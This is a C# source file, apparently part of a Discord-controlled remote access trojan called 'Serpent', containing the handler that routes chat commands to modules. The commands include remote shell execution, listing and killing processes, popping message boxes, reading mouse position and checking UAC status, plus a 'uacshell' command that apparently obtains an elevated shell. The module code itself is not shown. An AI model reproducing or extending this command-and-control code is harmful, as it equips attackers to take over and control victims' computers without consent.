using System;
using System.Threading.Tasks;
using Commands;
using Discord;
using Discord.Webhook;
using Discord.WebSocket;
using Helper;

namespace Events
{

    
    

    public static class Messaging {
    private static string Prefix = ";";

        public static async Task MessageReceive(SocketMessage msg)
        {
            if (!(msg is SocketUserMessage message) || message.Author.IsBot)
                return;

            if (!message.Content.StartsWith(Prefix))
                return;

            string[] fullCommand = message.Content.Substring(Prefix.Length).Split(" ");
            string commandName = fullCommand[0];
            string jointArgs = string.Join(" ", fullCommand[1..]);

            switch (commandName.ToLower())
            {
                case "help":
                    await Commands.HelpCmd.Run(message, fullCommand[1..]);
                    break;

                case "shell":
                    await Commands.Shell.Run(message, fullCommand[1..]);
                    break;

                case "processes":
                case "ps":
                    await Commands.ZProcesses.Run(message, fullCommand[1..]);
                    break;

                case "psinfo":
                    await Commands.PsInfo.Run(message, fullCommand[1..]);
                    break;

                case "crash":
               // Commands.Crash.Run(Message,FullCommand[1..]);

                break;

                case "msgbox":
                    await Commands.Messagebox.Run(message, fullCommand[1..]);
                    break;

                case "mousepos":
                    await Commands.CPos.Run(message, fullCommand[1..]);
                    break;

                case "kill":
                    await Commands.Kill.Run(message, fullCommand[1..]);
                    break;

                case "uaccheck":
                    await Commands.UACCheck.Run(message, fullCommand[1..]);
                    break;

                case "uacshell":
                    await Commands.UACShell.Run(message, fullCommand[1..]);
                    break;

                default:
                    Embed embed = new SerpentEmbed().GetEmbed(SerpentEmbeds.Error, "Invalid Command!", $"Command: ``{commandName}`` Not Found.");
                    await message.Channel.SendMessageAsync(embed: embed);
                    break;
            }
        }
    }
}
